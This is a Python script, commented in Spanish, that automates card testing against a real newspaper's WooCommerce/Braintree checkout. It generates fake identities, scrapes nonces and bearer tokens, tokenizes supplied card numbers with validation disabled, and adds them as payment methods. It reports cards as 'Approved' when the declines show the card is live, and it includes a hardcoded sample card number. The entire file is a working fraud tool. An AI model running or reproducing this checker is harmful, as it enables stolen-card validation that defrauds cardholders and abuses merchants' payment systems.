from httpx import AsyncClient
import uuid
import base64
import asyncio

async def b3moneris(cc, mes, ano, cvv):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=None, timeout=None) as session:
        email = uuid.uuid4().hex[:8] + '@gmail.com'

        def braintree_generate_uuid():
            return str(uuid.uuid4())
            
        response = await session.get("https://randomuser.me/api/1.2/?nat=US")
        user = response.text
        street = user.split('"street":"')[1].split('"')[0]
        city = user.split('"city":"')[1].split('"')[0]
        state1 = user.split('"state":"')[1].split('"')[0]
        zipcode = user.split('"postcode":')[1].split(',')[0]
        phone = user.split('"phone":"')[1].split('"')[0]
        name = user.split('"first":"')[1].split('"')[0]
        last = user.split('"last":"')[1].split('"')[0]
        
        state_mappings = {
            "Alabama": "AL", "Alaska": "AK", "Arizona": "AZ", "Arkansas": "AR",
            "California": "CA", "Colorado": "CO", "Connecticut": "CT", "Delaware": "DE",
            "Florida": "FL", "Georgia": "GA", "Hawaii": "HI", "Idaho": "ID",
            "Illinois": "IL", "Indiana": "IN", "Iowa": "IA", "Kansas": "KS",
            "Kentucky": "KY", "Louisiana": "LA", "Maine": "ME", "Maryland": "MD",
            "Massachusetts": "MA", "Michigan": "MI", "Minnesota": "MN", "Mississippi": "MS",
            "Missouri": "MO", "Montana": "MT", "Nebraska": "NE", "Nevada": "NV",
            "New Hampshire": "NH", "New Jersey": "NJ", "New Mexico": "NM", "NY": "NY",
            "North Carolina": "NC", "North Dakota": "ND", "Ohio": "OH", "Oklahoma": "OK",
            "Oregon": "OR", "Pennsylvania": "PA", "Rhode Island": "RI", "South Carolina": "SC",
            "South Dakota": "SD", "Tennessee": "TN", "Texas": "TX", "Utah": "UT",
            "Vermont": "VT", "Virginia": "VA", "Washington": "WA", "West Virginia": "WV",
            "Wisconsin": "WI", "Wyoming": "WY"
        }

        state = state_mappings.get(state1.capitalize(), "NY")

        # ////! -------------- Request Number 1 -------------- //// ADD TO CART
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://www.acadienouvelle.com/',
            'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        params = {
            'add-to-cart': '1262795',
            'utm_source': 'acadienouvelle',
            'utm_medium': 'abonnement',
            'utm_campaign': 'an7jour',
        }

        response = await session.get('https://moncompte.acadienouvelle.com/cart/', params=params, headers=headers)
        r1 = response.text

        # ////! -------------- Request Number 2 -------------- //// CHECKOUT
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://www.acadienouvelle.com/',
            'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://moncompte.acadienouvelle.com/commande/', headers=headers)
        r2 = response.text

        paynonce = r2.split('name="woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
        clientnonce = r2.split('client_token_nonce":"')[1].split('"')[0]

        # ////! -------------- Request Number 3 -------------- //// OBTENER EL BEARER CON BASE64
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','referer': 'https://moncompte.acadienouvelle.com/commande/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': clientnonce,
        }
        response = await session.post('https://moncompte.acadienouvelle.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        r3 = response.text

        token = r3.split('"data":"')[1].split('"')[0]
        bearer = base64.b64decode(token)
        bearer = bearer.decode('utf-8')    
        bearer = bearer.split('"authorizationFingerprint":"')[1].split('"')[0]

        # ////! -------------- Request Number 4 -------------- //// PETICION A B3 PARA OBTENER EL TOKEN
        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'authorization': f'Bearer {bearer}',
            'braintree-version': '2018-05-10',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_generate_uuid(),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        r4 = response.text

        tokenb3 = r4.split('"token":"')[1].split('"')[0]

        # ////! -------------- Request Number 5 -------------- //// SIMULACION DE COMPRA PARA LA CREACION DE CUENTA
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://moncompte.acadienouvelle.com',
            'priority': 'u=1, i',
            'referer': 'https://moncompte.acadienouvelle.com/commande/',
            'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'checkout',
        }

        data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fmoncompte.acadienouvelle.com%2Fmon-compte%2Fadd-payment-method%2F&wc_order_attribution_session_start_time=2024-11-09+17%3A01%3A38&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F130.0.0.0+Safari%2F537.36&billing_first_name={name}&billing_last_name={last}&billing_company=&billing_country=US&billing_address_1={street}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zipcode}&billing_phone={phone}&billing_email={email}&account_password=5346y4Y%25THED&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=5.75&wc-braintree-credit-card-cart-contains-subscription=1&wc_braintree_credit_card_payment_nonce={tokenb3}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&terms=on&terms-field=1&woocommerce-process-checkout-nonce={paynonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

        response = await session.post('https://moncompte.acadienouvelle.com/', params=params, headers=headers, data=data)
        r5 = response.text

        # ////! -------------- Request Number 6 -------------- //// PETICION A ADD PAYMENT PARA OBTENER LOS TOKENS
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://moncompte.acadienouvelle.com/mon-compte/payment-methods/',
            'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        response = await session.get('https://moncompte.acadienouvelle.com/mon-compte/add-payment-method/', headers=headers)
        r6 = response.text

        paynonce = r6.split('name="woocommerce-add-payment-method-nonce" value="')[1].split('"')[0]
        clientnonce = r6.split('client_token_nonce":"')[1].split('"')[0]

        # ////! -------------- Request Number 7 -------------- //// PETICION PARA OBTENER EL BEARER
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','referer': 'https://moncompte.acadienouvelle.com/commande/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': clientnonce,
        }
        response = await session.post('https://moncompte.acadienouvelle.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        r7 = response.text

        token = r7.split('"data":"')[1].split('"')[0]
        bearer = base64.b64decode(token)
        bearer = bearer.decode('utf-8')    
        bearer = bearer.split('"authorizationFingerprint":"')[1].split('"')[0]

        # ////! -------------- Request Number 8 -------------- //// PETICION A B3 PARA OBTENER EL TOKEN DE B3
        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'authorization': f'Bearer {bearer}',
            'braintree-version': '2018-05-10',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_generate_uuid(),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        r4 = response.text

        tokenb3 = r4.split('"token":"')[1].split('"')[0]

        # ////! -------------- Request Number 9 -------------- //// AÑADIR EL PAGO EN ADD PAYMENT 
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','referer': 'https://moncompte.acadienouvelle.com/mon-compte/add-payment-method/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',}
        
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': tokenb3,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': paynonce,
            '_wp_http_referer': '/mon-compte/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = await session.post('https://moncompte.acadienouvelle.com/mon-compte/add-payment-method/', headers=headers, data=data)
        resxd = response.text

         # ////! -------------- CAPTURAR RESPUESTAS -------------- //// GUARDAR LA RESPUESTA
        if 'Super ! Nouveau moyen de paiement ajouté' in resxd:
            status = "Approved ✅"
            msg = "Approved (1000)"

        else:
            msg = resxd.split('Status code ')[1].split('</li>')[0]

            if "Card Issuer Declined" in msg:
                status = 'Approved ✅'
            elif "Insufficient Funds" in msg:
                status = 'Approved ✅'
            elif "cvv" in msg:
                status = 'Approved ✅'
            elif "avs" in msg:
                status = 'Approved ✅'    
            else:
                status = 'Declined ❌'

        return status, msg
if __name__ == "__main__":
    print(asyncio.run(b3moneris("4584530000680381", "06", "2027", "155")))